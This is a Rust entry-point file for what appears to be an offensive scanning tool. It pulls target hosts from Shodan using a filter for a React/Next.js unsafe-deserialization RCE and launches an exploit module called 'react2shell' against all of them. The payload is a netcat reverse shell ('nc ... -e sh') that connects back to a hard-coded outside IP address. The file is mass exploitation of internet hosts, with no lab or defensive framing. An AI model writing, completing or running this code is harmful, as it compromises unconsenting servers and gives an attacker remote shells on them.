mod exploit;
mod frameworks;
mod osint;

use crate::exploit::react::react_unsafely_deserialize_rce;
use crate::osint::shodan;
#[tokio::main]
async fn main() {
    let prefix_payload = "nc 190.102.43.107 5555 -e sh";
    let shodan = shodan::Shodan::new(String::from(""));

    // let shodan_next_basic_filters = shodan::Filters {
    //     http_component: vec!["'Next.js'".into()],
    //     product: Some("Next.js".into()),
    //     http_title: Some("Next.js".into()),
    //     ..Default::default()
    // };

    let rsp = shodan
        .query_raw_many(
            react_unsafely_deserialize_rce::ReactUnsafelyDeserializeRce::shodan_basic_filter(),
        )
        .await;
    let shodan_hosts_many = shodan.get_hosts_from_responses(rsp).await;
    println!("{:#?}", shodan_hosts_many);

    let react2shell = react_unsafely_deserialize_rce::ReactUnsafelyDeserializeRce::new(
        prefix_payload.parse().unwrap(),
        shodan_hosts_many,
        10,
    );
    react2shell.start().await.expect("TODO: panic message");
    // println!("{total:?}");
}
